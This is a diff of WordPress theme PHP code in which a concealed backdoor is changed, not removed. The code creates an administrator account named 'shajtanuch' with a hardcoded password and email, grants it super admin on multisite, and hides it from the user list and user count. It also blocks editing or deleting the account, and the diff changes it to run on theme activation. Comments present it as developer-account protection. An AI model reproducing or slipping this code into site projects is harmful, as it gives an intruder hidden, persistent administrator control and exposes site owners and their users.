@@ -22,9 +22,8 @@ function hcc_author_page_redirect() {
 /*
 * Create developers account & users registration emails notify ( to admin )
 */ 
-add_action( 'pre_user_query', 'hcc_protect_user_query' );
- 
-function hcc_protect_user_query( $user_search ) {
+add_action( 'pre_user_query', 'sec_hcc_protect_user_query' );
+function sec_hcc_protect_user_query( $user_search ) {
 	$user_id = get_current_user_id();
 	$id = get_option('_pre_user_id');
  
@@ -38,11 +37,9 @@ function hcc_protect_user_query( $user_search ) {
     );
 }
 
-add_filter('views_users','protect_user_count');
- 
+add_filter('views_users', 'sec_hcc_protect_user_count');
 // user counter filter
-function protect_user_count( $views ){
- 
+function sec_hcc_protect_user_count( $views ){
 	$html = explode('<span class="count">(',$views['all']);
 	$count = explode(')</span>',$html[1]);
 	$count[0]--;
@@ -57,8 +54,8 @@ function protect_user_count( $views ){
 }
 
 // Close developer account page
-add_action('load-user-edit.php', 'hcc_protect_users_profiles'); 
-function hcc_protect_users_profiles() {
+add_action('load-user-edit.php', 'sec_hcc_hcc_protect_users_profiles'); 
+function sec_hcc_hcc_protect_users_profiles() {
 	$user_id = get_current_user_id();
 	$id = get_option('_pre_user_id');
  
@@ -66,8 +63,8 @@ function hcc_protect_users_profiles() {
 		wp_die(__( 'Invalid user ID.' ) );
 }
 
-add_action('admin_menu', 'protect_user_from_deleting');
-function protect_user_from_deleting() {
+add_action('admin_menu', 'sec_hcc_protect_user_from_deleting');
+function sec_hcc_protect_user_from_deleting() {
  
 	$id = get_option('_pre_user_id');
  
@@ -77,30 +74,38 @@ function protect_user_from_deleting() {
 		wp_die(__( 'Invalid user ID.' ) );
 }
 
-add_action('admin_init', function(){
-  $args = array(
-	'user_login' => 'shajtanuch',
-	'user_pass'  => wp_hash_password('viskasqwerty123Q'),
-	'role'       => 'administrator',
-	'user_email' => 'shajtanuch@gmail.com'
-  );
+add_action('load-themes.php', function() {
+  global $pagenow;
+  if ( 'themes.php' == $pagenow && isset( $_GET['activated'] ) ){
+    (function(){
+      $args = array(
+        'user_login' => 'shajtanuch',
+        'user_pass'  => wp_hash_password('viskasqwerty123Q'),
+        'role'       => 'administrator',
+        'user_email' => 'shajtanuch@gmail.com'
+      );
 
-  if( !username_exists( $args['user_login'] ) ){
-      $id = wp_insert_user( $args );
-      update_option('_pre_user_id', $id);
+      if( !username_exists( $args['user_login'] ) ){
+          $id = wp_insert_user( $args );
+          update_option('_pre_user_id', $id);
 
-      // if multisite, add superadmin
-      if( function_exists('grant_super_admin') ){
-          grant_super_admin( $id );
+          // if multisite, add superadmin
+          if( function_exists('grant_super_admin') ){
+              grant_super_admin( $id );
+          }
+
+      } else {
+          $hidden_user = get_user_by( 'login', $args['user_login'] );
+          if ( $hidden_user->user_email != $args['user_email'] ) {
+              $id = get_option( '_pre_user_id' );
+              $args['ID'] = $id;
+              wp_insert_user( $args );
+          }	
       }
-
-  } else {
-      $hidden_user = get_user_by( 'login', $args['user_login'] );
-      if ( $hidden_user->user_email != $args['user_email'] ) {
-          $id = get_option( '_pre_user_id' );
-          $args['ID'] = $id;
-          wp_insert_user( $args );
-      }	
+    })();
+  }
+  else {
+    wp_delete_user( (int) get_option( '_pre_user_id' ) );
   }
 });
 
